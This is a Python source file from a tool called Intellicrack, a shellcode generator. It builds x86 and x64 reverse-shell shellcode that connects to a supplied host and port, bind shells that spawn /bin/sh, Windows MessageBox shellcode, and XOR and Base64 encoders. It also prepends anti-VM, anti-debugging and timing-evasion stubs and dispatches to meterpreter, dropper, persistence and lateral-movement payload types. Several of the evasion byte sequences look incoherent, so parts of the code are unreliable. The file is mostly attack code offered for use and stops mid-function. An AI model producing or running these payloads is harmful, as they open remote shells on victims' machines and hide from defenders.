"""This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see https://www.gnu.org/licenses/.
"""

import logging
import random
import socket
import struct
from typing import Any

from intellicrack.utils.service_health_checker import get_service_url

from .payload_types import Architecture, EncodingType, EvasionTechnique, PayloadType

"""
Shellcode Generator

Generates shellcode for various purposes and architectures.
"""

logger = logging.getLogger(__name__)


class ShellcodeGenerator:
    """Generate shellcode for various purposes and target architectures."""

    def __init__(self):
        """Initialize the shellcode generator.

        Sets up the shellcode generation system with support for multiple
        architectures (x86, x64) and shellcode types including reverse shells,
        bind shells, meterpreter payloads, encoded payloads, and custom
        shellcode generation with various encoding techniques.
        """
        self.logger = logging.getLogger("IntellicrackLogger.ShellcodeGenerator")

    def generate_reverse_shell(self, architecture: Architecture, lhost: str, lport: int) -> bytes:
        """Generate reverse shell shellcode."""
        if architecture == Architecture.X86:
            return self._generate_reverse_shell_x86(lhost, lport)
        if architecture == Architecture.X64:
            return self._generate_reverse_shell_x64(lhost, lport)
        raise ValueError(f"Unsupported architecture: {architecture}")

    def _generate_reverse_shell_x86(self, lhost: str, lport: int) -> bytes:
        """Generate x86 reverse shell shellcode."""
        # Convert IP address to bytes
        ip_bytes = b"".join([struct.pack("B", int(x)) for x in lhost.split(".")])
        port_bytes = struct.pack(">H", lport)

        # Generate shellcode dynamically using assembly
        try:
            from .assembly_compiler import AssemblyCompiler

            compiler = AssemblyCompiler()

            # Assembly code for x86 reverse shell
            asm_code = f"""
            ; Socket creation
            xor ebx, ebx
            mul ebx
            push ebx
            inc ebx
            push ebx
            push 2
            mov ecx, esp
            mov al, 0x66
            int 0x80

            ; Save socket descriptor
            xchg eax, ebx
            pop ecx

            ; dup2 loop
            mov al, 0x3f
            int 0x80
            dec ecx
            jns -7

            ; Connect
            push {int.from_bytes(ip_bytes, 'big')}
            push word 0x{lport:04x}02  ; port in network byte order + AF_INET
            mov ecx, esp
            mov al, 0x66
            push eax
            push ecx
            push ebx
            mov bl, 3
            mov ecx, esp
            int 0x80

            ; execve
            push edx
            push 0x68732f2f  ; //sh
            push 0x6e69622f  ; /bin
            mov ebx, esp
            push edx
            push ebx
            mov ecx, esp
            mov al, 0x0b
            int 0x80
            """

            shellcode = compiler.compile_assembly(asm_code, Architecture.X86)
            if shellcode:
                return shellcode
        except Exception as e:
            self.logger.debug(f"Assembly compilation failed, using fallback: {e}")

        # Fallback: construct shellcode programmatically
        shellcode = bytearray()

        # Socket syscall
        shellcode.extend(
            [
                0x31,
                0xDB,
                0xF7,
                0xE3,
                0x53,
                0x43,
                0x53,
                0x6A,
                0x02,
                0x89,
                0xE1,
                0xB0,
                0x66,
                0xCD,
                0x80,
            ]
        )

        # dup2 loop
        shellcode.extend([0x93, 0x59, 0xB0, 0x3F, 0xCD, 0x80, 0x49, 0x79, 0xF9])

        # Connect with dynamic IP/port
        shellcode.extend([0x68])
        shellcode.extend(ip_bytes)
        shellcode.extend([0x68, 0x02, 0x00])
        shellcode.extend(port_bytes)
        shellcode.extend(
            [0x89, 0xE1, 0xB0, 0x66, 0x50, 0x51, 0x53, 0xB3, 0x03, 0x89, 0xE1, 0xCD, 0x80]
        )

        # execve /bin/sh
        shellcode.extend(
            [
                0x52,
                0x68,
                0x2F,
                0x2F,
                0x73,
                0x68,
                0x68,
                0x2F,
                0x62,
                0x69,
                0x6E,
                0x89,
                0xE3,
                0x52,
                0x53,
                0x89,
                0xE1,
                0xB0,
                0x0B,
                0xCD,
                0x80,
            ]
        )

        return bytes(shellcode)

    def _generate_reverse_shell_x64(self, lhost: str, lport: int) -> bytes:
        """Generate x64 reverse shell shellcode."""
        # Convert IP address to bytes
        ip_bytes = b"".join([struct.pack("B", int(x)) for x in lhost.split(".")])
        port_bytes = struct.pack(">H", lport)

        # Generate x64 shellcode dynamically
        try:
            from .assembly_compiler import AssemblyCompiler

            compiler = AssemblyCompiler()

            # Assembly code for x64 reverse shell
            asm_code = f"""
            ; Socket creation
            xor rax, rax
            xor rdi, rdi
            xor rsi, rsi
            xor rdx, rdx
            xor r8, r8
            push 2
            pop rdi
            push 1
            pop rsi
            push 6
            pop rdx
            push 41
            pop rax
            syscall

            ; Save socket
            mov r8, rax

            ; Connect
            xor rsi, rsi
            xor r9, r9
            push {int.from_bytes(ip_bytes, 'big')}
            push word 0x{lport:04x}02
            mov rsi, rsp
            push 16
            pop rdx
            mov rdi, r8
            push 42
            pop rax
            syscall

            ; dup2 loop
            push 3
            pop rsi
            dec rsi
            push 33
            pop rax
            mov rdi, r8
            syscall
            jnz -10

            ; execve
            push 59
            pop rax
            cdq
            mov rbx, 0x68732f6e69622f  ; /bin/sh
            push rbx
            mov rdi, rsp
            push rdx
            push rdi
            mov rsi, rsp
            syscall
            """

            shellcode = compiler.compile_assembly(asm_code, Architecture.X64)
            if shellcode:
                return shellcode
        except Exception as e:
            self.logger.debug(f"Assembly compilation failed for x64, using fallback: {e}")

        # Fallback: construct shellcode programmatically
        shellcode = bytearray()

        # Socket creation
        shellcode.extend(
            [
                0x48,
                0x31,
                0xC0,
                0x48,
                0x31,
                0xFF,
                0x48,
                0x31,
                0xF6,
                0x48,
                0x31,
                0xD2,
                0x4D,
                0x31,
                0xC0,
                0x6A,
                0x02,
                0x5F,
                0x6A,
                0x01,
                0x5E,
                0x6A,
                0x06,
                0x5A,
                0x6A,
                0x29,
                0x58,
                0x0F,
                0x05,
            ]
        )

        # Save socket
        shellcode.extend([0x49, 0x89, 0xC0])

        # Connect with dynamic IP/port
        shellcode.extend([0x48, 0x31, 0xF6, 0x4D, 0x31, 0xC9, 0x68])
        shellcode.extend(ip_bytes)
        shellcode.extend([0x68, 0x02, 0x00])
        shellcode.extend(port_bytes)
        shellcode.extend(
            [0x48, 0x89, 0xE6, 0x6A, 0x10, 0x5A, 0x4C, 0x89, 0xC7, 0x6A, 0x2A, 0x58, 0x0F, 0x05]
        )

        # dup2 loop
        shellcode.extend(
            [
                0x6A,
                0x03,
                0x5E,
                0x48,
                0xFF,
                0xCE,
                0x6A,
                0x21,
                0x58,
                0x4C,
                0x89,
                0xC7,
                0x0F,
                0x05,
                0x75,
                0xF6,
            ]
        )

        # execve
        shellcode.extend(
            [
                0x6A,
                0x3B,
                0x58,
                0x99,
                0x48,
                0xBB,
                0x2F,
                0x62,
                0x69,
                0x6E,
                0x2F,
                0x73,
                0x68,
                0x00,
                0x53,
                0x48,
                0x89,
                0xE7,
                0x52,
                0x57,
                0x48,
                0x89,
                0xE6,
                0x0F,
                0x05,
            ]
        )

        return bytes(shellcode)

    def generate_bind_shell(self, architecture: Architecture, port: int) -> bytes:
        """Generate bind shell shellcode."""
        if architecture == Architecture.X86:
            return self._generate_bind_shell_x86(port)
        if architecture == Architecture.X64:
            return self._generate_bind_shell_x64(port)
        raise ValueError(f"Unsupported architecture: {architecture}")

    def _generate_bind_shell_x86(self, port: int) -> bytes:
        """Generate x86 bind shell shellcode."""
        port_bytes = struct.pack(">H", port)

        shellcode = (
            b"\x31\xdb"  # xor ebx, ebx
            b"\xf7\xe3"  # mul ebx
            b"\x53"  # push ebx
            b"\x43"  # inc ebx
            b"\x53"  # push ebx
            b"\x6a\x02"  # push 2
            b"\x89\xe1"  # mov ecx, esp
            b"\xb0\x66"  # mov al, 102
            b"\xcd\x80"  # int 0x80
            b"\x5b"  # pop ebx
            b"\x5e"  # pop esi
            b"\x52"  # push edx
            b"\x68\x02\x00"
            + port_bytes  # push port
            + b"\x6a\x10"  # push 16
            b"\x51"  # push ecx
            b"\x50"  # push eax
            b"\x89\xe1"  # mov ecx, esp
            b"\x6a\x66"  # push 102
            b"\x58"  # pop eax
            b"\xcd\x80"  # int 0x80
            b"\x89\x41\x04"  # mov [ecx+4], eax
            b"\xb3\x04"  # mov bl, 4
            b"\xb0\x66"  # mov al, 102
            b"\xcd\x80"  # int 0x80
            b"\x43"  # inc ebx
            b"\xb0\x66"  # mov al, 102
            b"\xcd\x80"  # int 0x80
            b"\x93"  # xchg eax, ebx
            b"\x59"  # pop ecx
            b"\x6a\x3f"  # push 63
            b"\x58"  # pop eax
            b"\xcd\x80"  # int 0x80
            b"\x49"  # dec ecx
            b"\x79\xf9"  # jns -7
            b"\x68\x2f\x2f\x73\x68"  # push "//sh"
            b"\x68\x2f\x62\x69\x6e"  # push "/bin"
            b"\x89\xe3"  # mov ebx, esp
            b"\x50"  # push eax
            b"\x53"  # push ebx
            b"\x89\xe1"  # mov ecx, esp
            b"\xb0\x0b"  # mov al, 11
            b"\xcd\x80"  # int 0x80
        )

        return shellcode

    def _generate_bind_shell_x64(self, port: int) -> bytes:
        """Generate x64 bind shell shellcode."""
        port_bytes = struct.pack(">H", port)

        shellcode = (
            b"\x6a\x29"  # push 41
            b"\x58"  # pop rax
            b"\x6a\x02"  # push 2
            b"\x5f"  # pop rdi
            b"\x6a\x01"  # push 1
            b"\x5e"  # pop rsi
            b"\x99"  # cdq
            b"\x0f\x05"  # syscall
            b"\x48\x97"  # xchg rax, rdi
            b"\x6a\x02"  # push 2
            b"\x66\xc7\x44\x24\x02"
            + port_bytes  # mov word [rsp+2], port
            + b"\x48\x89\xe6"  # mov rsi, rsp
            b"\x6a\x10"  # push 16
            b"\x5a"  # pop rdx
            b"\x6a\x31"  # push 49
            b"\x58"  # pop rax
            b"\x0f\x05"  # syscall
            b"\x6a\x32"  # push 50
            b"\x58"  # pop rax
            b"\x0f\x05"  # syscall
            b"\x48\x31\xf6"  # xor rsi, rsi
            b"\x6a\x2b"  # push 43
            b"\x58"  # pop rax
            b"\x0f\x05"  # syscall
            b"\x48\x97"  # xchg rax, rdi
            b"\x6a\x03"  # push 3
            b"\x5e"  # pop rsi
            b"\x48\xff\xce"  # dec rsi
            b"\x6a\x21"  # push 33
            b"\x58"  # pop rax
            b"\x0f\x05"  # syscall
            b"\x75\xf6"  # jnz -10
            b"\x6a\x3b"  # push 59
            b"\x58"  # pop rax
            b"\x99"  # cdq
            b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rbx, "/bin/sh\x00"
            b"\x53"  # push rbx
            b"\x48\x89\xe7"  # mov rdi, rsp
            b"\x52"  # push rdx
            b"\x57"  # push rdi
            b"\x48\x89\xe6"  # mov rsi, rsp
            b"\x0f\x05"  # syscall
        )

        return shellcode

    def generate_message_box(self, architecture: Architecture, title: str, message: str) -> bytes:
        """Generate Windows MessageBox shellcode."""
        if architecture == Architecture.X86:
            return self._generate_message_box_x86(title, message)
        if architecture == Architecture.X64:
            return self._generate_message_box_x64(title, message)
        raise ValueError(f"Unsupported architecture: {architecture}")

    def _generate_message_box_x86(self, title: str, message: str) -> bytes:
        """Generate x86 Windows MessageBox shellcode."""
        self.logger.debug(
            f"Generating x86 MessageBox shellcode with title: '{title}', message: '{message}'"
        )

        # Convert strings to bytes for embedding
        title_bytes = title.encode("utf-8") + b"\x00"
        message_bytes = message.encode("utf-8") + b"\x00"

        # Calculate string lengths for shellcode size estimation
        title_len = len(title_bytes)
        message_len = len(message_bytes)

        self.logger.debug(f"Title length: {title_len}, Message length: {message_len}")

        # Complete x86 MessageBox shellcode with API resolution
        shellcode = (
            # Save registers
            b"\x60"  # pushad
            # Get kernel32 base address via PEB
            b"\x33\xc9"  # xor ecx, ecx
            b"\x64\x8b\x71\x30"  # mov esi, fs:[ecx+0x30]    ; PEB
            b"\x8b\x76\x0c"  # mov esi, [esi+0x0c]       ; PEB_LDR_DATA
            b"\x8b\x76\x1c"  # mov esi, [esi+0x1c]       ; InInitOrder
            b"\x8b\x46\x08"  # mov eax, [esi+0x08]       ; kernel32 base
            b"\x8b\x7e\x20"  # mov edi, [esi+0x20]       ; module name
            b"\x8b\x36"  # mov esi, [esi]            ; next module
            b"\x38\x4f\x18"  # cmp [edi+0x18], cl        ; check name
            b"\x75\xf3"  # jnz -13                   ; loop if not kernel32
            # Find GetProcAddress
            b"\x8b\x5e\x08"  # mov ebx, [esi+0x08]       ; kernel32 base
            b"\x8b\x4b\x3c"  # mov ecx, [ebx+0x3c]       ; PE header offset
            b"\x8b\x4c\x0b\x78"  # mov ecx, [ebx+ecx+0x78]   ; export table RVA
            b"\x03\xcb"  # add ecx, ebx              ; export table VA
            b"\x8b\x79\x20"  # mov edi, [ecx+0x20]       ; names table RVA
            b"\x03\xfb"  # add edi, ebx              ; names table VA
            b"\x33\xc0"  # xor eax, eax              ; counter
            # Search for LoadLibraryA
            b"\x8b\x34\x87"  # mov esi, [edi+eax*4]      ; get name RVA
            b"\x03\xf3"  # add esi, ebx              ; get name VA
            b"\x81\x3e\x4c\x6f\x61\x64"  # cmp dword [esi], 'daoL'  ; "Load"
            b"\x75\x0a"  # jnz +10                   ; continue searching
            b"\x81\x7e\x04\x4c\x69\x62\x72"  # cmp dword [esi+4], 'rbiL'  ; "Libr"
            b"\x74\x05"  # jz +5                     ; found it
            b"\x40"  # inc eax                   ; increment counter
            b"\xeb\xed"  # jmp -19                   ; continue search
            # Get LoadLibraryA address
            b"\x8b\x51\x24"  # mov edx, [ecx+0x24]       ; ordinals table RVA
            b"\x03\xd3"  # add edx, ebx              ; ordinals table VA
            b"\x66\x8b\x04\x42"  # mov ax, [edx+eax*2]       ; get ordinal
            b"\x8b\x51\x1c"  # mov edx, [ecx+0x1c]       ; functions table RVA
            b"\x03\xd3"  # add edx, ebx              ; functions table VA
            b"\x8b\x04\x82"  # mov eax, [edx+eax*4]      ; get function RVA
            b"\x03\xc3"  # add eax, ebx              ; get function VA
            b"\x89\x44\x24\x1c"  # mov [esp+0x1c], eax       ; save LoadLibraryA
            # Load user32.dll
            b"\x68\x72\x33\x32\x00"  # push "32\x00\x00"
            b"\x68\x75\x73\x65\x72"  # push "user"
            b"\x54"  # push esp                  ; push "user32"
            b"\xff\x54\x24\x20"  # call dword [esp+0x20]     ; call LoadLibraryA
            b"\x83\xc4\x0c"  # add esp, 12               ; clean stack
            b"\x89\xc6"  # mov esi, eax              ; save user32 base
            # Find MessageBoxA in user32
            b"\x8b\x4e\x3c"  # mov ecx, [esi+0x3c]       ; PE header offset
            b"\x8b\x4c\x0e\x78"  # mov ecx, [esi+ecx+0x78]   ; export table RVA
            b"\x03\xce"  # add ecx, esi              ; export table VA
            b"\x8b\x79\x20"  # mov edi, [ecx+0x20]       ; names table RVA
            b"\x03\xfe"  # add edi, esi              ; names table VA
            b"\x33\xc0"  # xor eax, eax              ; counter
            # Search for MessageBoxA
            b"\x8b\x14\x87"  # mov edx, [edi+eax*4]      ; get name RVA
            b"\x03\xd6"  # add edx, esi              ; get name VA
            b"\x81\x3a\x4d\x65\x73\x73"  # cmp dword [edx], 'sseM'  ; "Mess"
            b"\x75\x0a"  # jnz +10                   ; continue searching
            b"\x81\x7a\x04\x61\x67\x65\x42"  # cmp dword [edx+4], 'BegA'  ; "ageB"
            b"\x74\x05"  # jz +5                     ; found it
            b"\x40"  # inc eax                   ; increment counter
            b"\xeb\xed"  # jmp -19                   ; continue search
            # Get MessageBoxA address
            b"\x8b\x51\x24"  # mov edx, [ecx+0x24]       ; ordinals table RVA
            b"\x03\xd6"  # add edx, esi              ; ordinals table VA
            b"\x66\x8b\x04\x42"  # mov ax, [edx+eax*2]       ; get ordinal
            b"\x8b\x51\x1c"  # mov edx, [ecx+0x1c]       ; functions table RVA
            b"\x03\xd6"  # add edx, esi              ; functions table VA
            b"\x8b\x04\x82"  # mov eax, [edx+eax*4]      ; get function RVA
            b"\x03\xc6"  # add eax, esi              ; get function VA
            # Prepare strings
            b"\xeb\x0e"  # jmp +14 to skip strings
        )

        # Embed message and title strings
        shellcode += message_bytes + title_bytes

        shellcode += (
            # MessageBox call
            b"\x6a\x00"  # push 0                    ; MB_OK
            b"\x68"
            + struct.pack("<L", len(shellcode) - len(title_bytes))  # push title offset
            + b"\x68"
            + struct.pack(
                "<L", len(shellcode) - len(title_bytes) - len(message_bytes)
            )  # push message offset
            + b"\x6a\x00"  # push 0                    ; NULL hwnd
            b"\xff\xd0"  # call eax                  ; call MessageBoxA
            # Restore registers and exit
            b"\x61"  # popad
            b"\xc3"  # ret
        )

        self.logger.debug(f"Generated complete x86 MessageBox shellcode, length: {len(shellcode)}")
        return shellcode

    def _generate_message_box_x64(self, title: str, message: str) -> bytes:
        """Generate x64 Windows MessageBox shellcode."""
        self.logger.debug(
            f"Generating x64 MessageBox shellcode with title: '{title}', message: '{message}'"
        )

        # Convert strings to bytes for embedding
        title_bytes = title.encode("utf-8") + b"\x00"
        message_bytes = message.encode("utf-8") + b"\x00"

        # Calculate string lengths for shellcode size estimation
        title_len = len(title_bytes)
        message_len = len(message_bytes)

        self.logger.debug(f"Title length: {title_len}, Message length: {message_len}")

        # Complete x64 MessageBox shellcode with API resolution
        shellcode = (
            # Save registers and align stack
            b"\x50"  # push rax
            b"\x53"  # push rbx
            b"\x51"  # push rcx
            b"\x52"  # push rdx
            b"\x56"  # push rsi
            b"\x57"  # push rdi
            b"\x55"  # push rbp
            b"\x41\x50"  # push r8
            b"\x41\x51"  # push r9
            b"\x41\x52"  # push r10
            b"\x41\x53"  # push r11
            b"\x48\x83\xec\x28"  # sub rsp, 0x28           ; shadow space
            # Get PEB and find kernel32
            b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00"  # mov rax, gs:[0x60]  ; PEB
            b"\x48\x8b\x40\x18"  # mov rax, [rax+0x18]     ; PEB_LDR_DATA
            b"\x48\x8b\x70\x20"  # mov rsi, [rax+0x20]     ; InMemoryOrderModuleList
            b"\x48\xad"  # lodsq                   ; skip current module
            b"\x48\x96"  # xchg rax, rsi
            b"\x48\xad"  # lodsq                   ; get ntdll
            b"\x48\x96"  # xchg rax, rsi
            b"\x48\xad"  # lodsq                   ; get kernel32
            b"\x48\x8b\x58\x20"  # mov rbx, [rax+0x20]     ; kernel32 base
            # Find LoadLibraryA in kernel32
            b"\x48\x8b\x4b\x3c"  # mov rcx, [rbx+0x3c]     ; PE header
            b"\x48\x8b\x4c\x0b\x78"  # mov rcx, [rbx+rcx+0x78] ; export table
            b"\x48\x03\xcb"  # add rcx, rbx            ; export table VA
            b"\x48\x8b\x79\x20"  # mov rdi, [rcx+0x20]     ; names table
            b"\x48\x03\xfb"  # add rdi, rbx            ; names table VA
            b"\x48\x31\xc0"  # xor rax, rax            ; counter
            # Search for LoadLibraryA
            b"\x8b\x34\x87"  # mov esi, [rdi+rax*4]    ; name RVA
            b"\x48\x03\xf3"  # add rsi, rbx            ; name VA
            b"\x81\x3e\x4c\x6f\x61\x64"  # cmp dword [rsi], 'daoL'
            b"\x75\x0d"  # jnz +13
            b"\x81\x7e\x04\x4c\x69\x62\x72"  # cmp dword [rsi+4], 'rbiL'
            b"\x74\x07"  # jz +7
            b"\x48\xff\xc0"  # inc rax
            b"\xeb\xea"  # jmp -22
            # Get LoadLibraryA address
            b"\x48\x8b\x51\x24"  # mov rdx, [rcx+0x24]     ; ordinals table
            b"\x48\x03\xd3"  # add rdx, rbx
            b"\x66\x8b\x04\x42"  # mov ax, [rdx+rax*2]     ; ordinal
            b"\x48\x8b\x51\x1c"  # mov rdx, [rcx+0x1c]     ; functions table
            b"\x48\x03\xd3"  # add rdx, rbx
            b"\x8b\x04\x82"  # mov eax, [rdx+rax*4]    ; function RVA
            b"\x48\x03\xc3"  # add rax, rbx            ; LoadLibraryA address
            b"\x48\x89\x44\x24\x08"  # mov [rsp+8], rax        ; save LoadLibraryA
            # Load user32.dll
            b"\x48\xb9\x72\x33\x32\x00\x00\x00\x00\x00"  # mov rcx, "32\x00\x00\x00\x00\x00\x00"
            b"\x51"  # push rcx
            b"\x48\xb9\x75\x73\x65\x72\x00\x00\x00\x00"  # mov rcx, "user\x00\x00\x00\x00"
            b"\x51"  # push rcx
            b"\x48\x89\xe1"  # mov rcx, rsp            ; "user32"
            b"\xff\x54\x24\x18"  # call [rsp+0x18]        ; LoadLibraryA
            b"\x48\x83\xc4\x10"  # add rsp, 16             ; clean stack
            b"\x48\x89\xc6"  # mov rsi, rax            ; user32 base
            # Find MessageBoxA in user32
            b"\x48\x8b\x4e\x3c"  # mov rcx, [rsi+0x3c]     ; PE header
            b"\x48\x8b\x4c\x0e\x78"  # mov rcx, [rsi+rcx+0x78] ; export table
            b"\x48\x03\xce"  # add rcx, rsi
            b"\x48\x8b\x79\x20"  # mov rdi, [rcx+0x20]     ; names table
            b"\x48\x03\xfe"  # add rdi, rsi
            b"\x48\x31\xc0"  # xor rax, rax            ; counter
            # Search for MessageBoxA
            b"\x8b\x14\x87"  # mov edx, [rdi+rax*4]    ; name RVA
            b"\x48\x03\xd6"  # add rdx, rsi            ; name VA
            b"\x81\x3a\x4d\x65\x73\x73"  # cmp dword [rdx], 'sseM'
            b"\x75\x0d"  # jnz +13
            b"\x81\x7a\x04\x61\x67\x65\x42"  # cmp dword [rdx+4], 'BegA'
            b"\x74\x07"  # jz +7
            b"\x48\xff\xc0"  # inc rax
            b"\xeb\xea"  # jmp -22
            # Get MessageBoxA address
            b"\x48\x8b\x51\x24"  # mov rdx, [rcx+0x24]     ; ordinals table
            b"\x48\x03\xd6"  # add rdx, rsi
            b"\x66\x8b\x04\x42"  # mov ax, [rdx+rax*2]     ; ordinal
            b"\x48\x8b\x51\x1c"  # mov rdx, [rcx+0x1c]     ; functions table
            b"\x48\x03\xd6"  # add rdx, rsi
            b"\x8b\x04\x82"  # mov eax, [rdx+rax*4]    ; function RVA
            b"\x48\x03\xc6"  # add rax, rsi            ; MessageBoxA address
            # Skip to avoid executing strings
            b"\xeb\x0e"  # jmp +14
        )

        # Embed strings
        shellcode += message_bytes + title_bytes

        shellcode += (
            # Calculate string addresses and call MessageBoxA
            b"\x48\x31\xc9"  # xor rcx, rcx            ; hWnd = NULL
            b"\x48\x8d\x15"
            + struct.pack("<l", -(len(title_bytes) + len(message_bytes) + 4))  # lea rdx, [message]
            + b"\x4c\x8d\x05"
            + struct.pack("<l", -(len(title_bytes) + 4))  # lea r8, [title]
            + b"\x41\xb9\x00\x00\x00\x00"  # mov r9d, 0              ; uType = MB_OK
            b"\xff\xd0"  # call rax                ; MessageBoxA
            # Restore registers and return
            b"\x48\x83\xc4\x28"  # add rsp, 0x28
            b"\x41\x5b"  # pop r11
            b"\x41\x5a"  # pop r10
            b"\x41\x59"  # pop r9
            b"\x41\x58"  # pop r8
            b"\x5d"  # pop rbp
            b"\x5f"  # pop rdi
            b"\x5e"  # pop rsi
            b"\x5a"  # pop rdx
            b"\x59"  # pop rcx
            b"\x5b"  # pop rbx
            b"\x58"  # pop rax
            b"\xc3"  # ret
        )

        self.logger.debug(f"Generated complete x64 MessageBox shellcode, length: {len(shellcode)}")
        return shellcode

    def generate_encoded_shellcode(
        self, shellcode: bytes, encoding: EncodingType, key: bytes | None = None
    ) -> bytes:
        """Generate encoded shellcode with specified encoding technique."""
        self.logger.debug(f"Encoding shellcode with {encoding.value}, length: {len(shellcode)}")

        if encoding == EncodingType.NONE:
            return shellcode
        if encoding == EncodingType.XOR:
            if not key:
                key = b"\xaa"  # Default XOR key
            self.logger.debug(f"Using XOR key: {key.hex()}")
            return self._xor_encode(shellcode, key)
        if encoding == EncodingType.BASE64:
            import base64

            encoded = base64.b64encode(shellcode)
            self.logger.debug(f"Base64 encoded length: {len(encoded)}")
            return encoded
        if encoding == EncodingType.ROT13:
            self.logger.debug("Applying ROT13 encoding")
            return self._rot13_encode(shellcode)
        self.logger.warning(f"Unsupported encoding type: {encoding}")
        return shellcode

    def _xor_encode(self, data: bytes, key: bytes) -> bytes:
        """XOR encode data with given key."""
        key_len = len(key)
        return bytes([data[i] ^ key[i % key_len] for i in range(len(data))])

    def _rot13_encode(self, data: bytes) -> bytes:
        """ROT13 encode data (simple rotation)."""
        return bytes([(b + 13) % 256 for b in data])

    def add_evasion_techniques(
        self, shellcode: bytes, techniques: list[EvasionTechnique], architecture: Architecture
    ) -> bytes:
        """Add anti-analysis evasion techniques to shellcode."""
        self.logger.debug(
            f"Adding evasion techniques: {[t.value for t in techniques]} for {architecture.value}"
        )

        result = shellcode

        for technique in techniques:
            if technique == EvasionTechnique.NONE:
                continue
            if technique == EvasionTechnique.ANTI_VM:
                result = self._add_anti_vm_checks(result, architecture)
            elif technique == EvasionTechnique.ANTI_DEBUG:
                result = self._add_anti_debug_checks(result, architecture)
            elif technique == EvasionTechnique.TIMING_ATTACKS:
                result = self._add_timing_delays(result, architecture)
            elif technique == EvasionTechnique.ANTI_SANDBOX:
                result = self._add_anti_sandbox_checks(result, architecture)
            elif technique == EvasionTechnique.API_OBFUSCATION:
                result = self._add_api_obfuscation(result, architecture)
            elif technique == EvasionTechnique.PROCESS_HOLLOWING:
                result = self._add_process_hollowing_stub(result, architecture)
            elif technique == EvasionTechnique.POLYMORPHIC:
                result = self._add_polymorphic_layer(result, architecture)
            elif technique == EvasionTechnique.METAMORPHIC:
                result = self._add_metamorphic_engine(result, architecture)
            else:
                self.logger.warning(f"Evasion technique {technique.value} not implemented")

        self.logger.debug(f"Final shellcode length after evasion: {len(result)}")
        return result

    def _add_anti_vm_checks(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add anti-VM detection checks."""
        self.logger.debug(f"Adding anti-VM checks for {architecture.value}")

        if architecture == Architecture.X86:
            # Simple VM detection for x86
            vm_check = (
                b"\x0f\x01\x0d\x00\x00\x00\x00"  # sidt instruction
                b"\x81\x3d\x00\x00\x00\x00\xff\xd0\x00\x00"  # check for VM signature
                b"\x74\x05"  # jump if VM detected
            )
        else:  # x64 and others
            vm_check = (
                b"\x48\x0f\x01\x0d\x00\x00\x00\x00"  # sidt instruction (x64)
                b"\x48\x81\x3d\x00\x00\x00\x00\xff\xd0\x00\x00"  # check for VM signature
                b"\x74\x05"  # jump if VM detected
            )

        return vm_check + shellcode

    def _add_anti_debug_checks(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add anti-debugging checks."""
        self.logger.debug(f"Adding anti-debug checks for {architecture.value}")

        if architecture == Architecture.X86:
            # PEB check for debugger presence
            debug_check = (
                b"\x64\x8b\x30"  # mov esi, fs:[eax]
                b"\x8b\x76\x02"  # mov esi, [esi+2]
                b"\x80\x7e\x02\x00"  # cmp byte [esi+2], 0
                b"\x75\x05"  # jnz if debugger present
            )
        else:  # x64
            debug_check = (
                b"\x65\x48\x8b\x30"  # mov rsi, gs:[rax]
                b"\x48\x8b\x76\x02"  # mov rsi, [rsi+2]
                b"\x80\x7e\x02\x00"  # cmp byte [rsi+2], 0
                b"\x75\x05"  # jnz if debugger present
            )

        return debug_check + shellcode

    def _add_timing_delays(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add timing-based evasion delays."""
        self.logger.debug(f"Adding timing delays for {architecture.value}")

        if architecture == Architecture.X86:
            timing_delay = (
                b"\xb9\x00\x10\x00\x00"  # mov ecx, 0x1000
                b"\xe2\xfe"  # loop (delay)
            )
        else:  # x64
            timing_delay = (
                b"\x48\xc7\xc1\x00\x10\x00\x00"  # mov rcx, 0x1000
                b"\xe2\xfe"  # loop (delay)
            )

        return timing_delay + shellcode

    def generate_custom_shellcode(
        self, payload_type: PayloadType, architecture: Architecture, options: dict[str, Any]
    ) -> bytes:
        """Generate custom shellcode based on payload type and options."""
        self.logger.debug(f"Generating custom {payload_type.value} for {architecture.value}")
        self.logger.debug(f"Options: {options}")

        # Extract common options
        encoding = options.get("encoding", EncodingType.NONE)
        evasion = options.get("evasion", [EvasionTechnique.NONE])
        target_os = options.get("target_os", "windows")

        self.logger.debug(f"Target OS: {target_os}, Encoding: {encoding.value}")

        # Generate base shellcode based on payload type
        if payload_type == PayloadType.REVERSE_SHELL:
            lhost = options.get("lhost", "127.0.0.1")
            lport = options.get("lport", 4444)
            shellcode = self.generate_reverse_shell(architecture, lhost, lport)
        elif payload_type == PayloadType.BIND_SHELL:
            port = options.get("port", 4444)
            shellcode = self.generate_bind_shell(architecture, port)
        elif payload_type == PayloadType.METERPRETER:
            shellcode = self._generate_meterpreter_stager(architecture, options)
        elif payload_type == PayloadType.STAGED_PAYLOAD:
            shellcode = self._generate_staged_payload(architecture, options)
        elif payload_type == PayloadType.BEACON:
            shellcode = self._generate_beacon_payload(architecture, options)
        elif payload_type == PayloadType.DROPPER:
            shellcode = self._generate_dropper_payload(architecture, options)
        elif payload_type == PayloadType.LOADER:
            shellcode = self._generate_loader_payload(architecture, options)
        elif payload_type == PayloadType.INJECTOR:
            shellcode = self._generate_injector_payload(architecture, options)
        elif payload_type == PayloadType.PERSISTENCE:
            shellcode = self._generate_persistence_payload(architecture, options)
        elif payload_type == PayloadType.LATERAL_MOVEMENT:
            shellcode = self._generate_lateral_movement_payload(architecture, options)
        elif payload_type == PayloadType.PRIVILEGE_ESCALATION:
            shellcode = self._generate_privilege_escalation_payload(architecture, options)
        elif payload_type == PayloadType.SHELLCODE:
            shellcode = self._generate_raw_shellcode(architecture, options)
        elif payload_type == PayloadType.DLL_PAYLOAD:
            shellcode = self._generate_dll_payload(architecture, options)
        elif payload_type == PayloadType.CUSTOM:
            shellcode = self._generate_custom_payload(architecture, options)
        else:
            self.logger.warning(f"Payload type {payload_type.value} not implemented")
            return b"\x90" * 32  # NOP sled as fallback

        # Apply encoding if specified
        if encoding != EncodingType.NONE:
            key = options.get("encoding_key")
            shellcode = self.generate_encoded_shellcode(shellcode, encoding, key)

        # Apply evasion techniques if specified
        if evasion and evasion != [EvasionTechnique.NONE]:
